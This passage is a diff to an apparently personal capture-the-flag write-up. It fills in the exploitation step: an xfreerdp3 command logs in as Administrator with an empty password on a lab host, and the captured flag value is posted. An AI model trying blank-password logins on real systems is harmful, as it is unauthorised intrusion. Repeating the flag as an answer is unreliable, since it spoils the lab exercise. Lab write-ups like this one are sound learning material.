@@ -74,30 +74,16 @@ gobuster dir -u http://[IP] -w /usr/share/wordlists/dirb/common.txt
 
 ## 🛡️ 2. Exploitation
 ### The Vulnerability
-
+The Admin password was not set, so the hacker can RDP into the machine
 
 ### Getting the Flag
-*The exact commands run to navigate the system or database to retrieve the final flag.*
-
 ```bash
-cat user.txt
+xfreerdp3 /u:Administrator /p: /v:10.129.4.46
 ```
 
+the flag is on the Desktop named `flag.txt`
+
+>951fa96d7830c451b536be5a6be008a0
 ---
 
-## 🔝 3. Privilege Escalation
-### Enumeration
-*Searching for a path to Root/Administrator.*
-
-### Root Flag
-*Final steps to compromise the machine.*
-
----
-
-## 📝 4. Final Thoughts
-**Key Takeaways:**
-* [What did you learn from this machine?]
-* [Which tools were most effective?]
-
----
 *Note: This write-up is for educational purposes and personal tracking only.*
